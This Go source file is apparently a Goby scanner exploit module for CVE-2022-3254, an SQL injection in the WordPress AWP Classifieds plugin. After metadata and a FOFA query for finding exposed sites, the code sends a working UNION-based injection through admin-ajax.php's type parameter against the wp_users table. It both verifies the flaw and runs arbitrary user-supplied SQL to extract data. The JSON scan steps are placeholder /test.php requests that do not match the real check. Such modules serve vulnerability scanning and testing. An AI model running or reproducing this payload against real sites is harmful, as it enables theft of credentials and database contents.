package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin AWP Classifieds SQL injection vulnerability (CVE-2022-3254)",
    "Description": "<p>WordPress plugin AWP Classifieds is a leading plug-in that quickly and easily adds classified ads sections to your WordPress website in minutes.</p><p>WordPress plugin AWP Classifieds has an SQL injection vulnerability prior to 4.3, which is caused by the plugin's inability to escape the type parameter correctly. Attackers can exploit the vulnerability to obtain sensitive information such as user names and passwords.</p>",
    "Product": "WordPress-AWP Classifieds",
    "Homepage": "https://wordpress.org/plugins/another-wordpress-classifieds-plugin/",
    "DisclosureDate": "2022-10-31",
    "Author": "tangyunmingt@gmail.com",
    "FofaQuery": "body=\"wp-content/plugins/another-wordpress-classifieds\"",
    "GobyQuery": "body=\"wp-content/plugins/another-wordpress-classifieds\"",
    "Level": "3",
    "Impact": "<p>WordPress plugin AWP Classifieds has an SQL injection vulnerability prior to 4.3, which is caused by the plugin's inability to escape the type parameter correctly. Attackers can exploit the vulnerability to obtain sensitive information such as user names and passwords.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/another-wordpress-classifieds-plugin/\">https://wordpress.org/plugins/another-wordpress-classifieds-plugin/</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/546c47c2-5b4b-46db-b754-c6b43aef2660"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-3254"
    ],
    "CNNVD": [
        "CNNVD-202210-2553"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress AWP Classifieds 插件 admin-ajax.php 文件 type 参数SQL注入漏洞（CVE-2022-3254）",
            "Product": "WordPress- AWP Classifieds",
            "Description": "<p>WordPress plugin AWP Classifieds 是一款领先的插件，可以在几分钟内快速轻松地将分类广告部分添加到您的 WordPress 网站。</p><p>WordPress plugin AWP Classifieds</span> 4.3之前版本存在SQL注入漏洞，该漏洞源于插件无法正确转义 type 参数。攻击者可利用漏洞获取用户名密码等敏感信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/another-wordpress-classifieds-plugin/\">https://wordpress.org/plugins/another-wordpress-classifieds-plugin/</a><a href=\"https://wordpress.org/plugins/photo-gallery/\"></a><br></p>",
            "Impact": "<p>WordPress plugin AWP Classifieds</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;4.3之前版本存在SQL注入漏洞，该漏洞源于插件无法正确转义 type 参数。攻击者可利用漏洞获取用户名密码等敏感信息。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress plugin AWP Classifieds SQL injection vulnerability (CVE-2022-3254)",
            "Product": "WordPress-AWP Classifieds",
            "Description": "<p>WordPress plugin AWP Classifieds is a leading plug-in that quickly and easily adds classified ads sections to your WordPress website in minutes.</p><p>WordPress plugin AWP Classifieds has an SQL injection vulnerability prior to 4.3, which is caused by the plugin's inability to escape the type parameter correctly. Attackers can exploit the vulnerability to obtain sensitive information such as user names and passwords.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/another-wordpress-classifieds-plugin/\">https://wordpress.org/plugins/another-wordpress-classifieds-plugin/</a><br></p>",
            "Impact": "<p>WordPress plugin AWP Classifieds has an SQL injection vulnerability prior to 4.3, which is caused by the plugin's inability to escape the type parameter correctly. Attackers can exploit the vulnerability to obtain sensitive information such as user names and passwords.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10767"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			requestConfig := httpclient.NewGetRequestConfig("/wp-admin/admin-ajax.php?action=awpcp-get-regions-options&parent_type=country&context=search&parent=Algeria&type=user_login%60+FROM+wp_users+UNION+ALL+SELECT+md5(3243563454354365611235434);--+-")
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, requestConfig); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e486e011e05d87f14381be3ea3005a6f")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sql := ss.Params["sql"].(string)
			requestConfig := httpclient.NewGetRequestConfig("/wp-admin/admin-ajax.php?action=awpcp-get-regions-options&parent_type=country&context=search&parent=Algeria&type=user_login%60+FROM+wp_users+UNION+ALL+SELECT+"+sql+";--+-")
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig); err == nil {
				path := regexp.MustCompile(`"id":"(.*?)",`).FindAllString(resp.RawBody,-1)

				expResult.Success = true
				expResult.Output = path[len(path)-1]
			}
			return expResult
		},
	))
}